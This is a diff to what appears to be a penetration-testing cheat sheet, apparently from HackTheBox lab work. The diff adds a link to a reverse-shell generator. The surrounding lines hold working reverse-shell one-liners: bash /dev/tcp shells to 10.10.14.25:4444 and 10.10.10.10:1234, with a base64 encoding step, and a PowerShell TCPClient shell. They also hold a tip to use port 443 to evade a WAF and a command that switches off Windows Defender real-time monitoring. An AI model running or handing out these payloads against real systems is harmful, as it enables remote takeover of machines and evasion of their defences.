@@ -1,6 +1,8 @@
 ! Use 443 port to evade WAF.
 #shell
 
+#### Generator
+https://www.revshells.com/
 #### Basic bash shell
 ```bash
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
@@ -75,7 +77,6 @@ root@kali$ ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
 ```
 
 bash shells:
-
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
@@ -91,9 +92,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```
 
 ### Windows
-
 Disable AV to allow running shell from admin's powershell:
-
 ```powershell
 PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
 ```
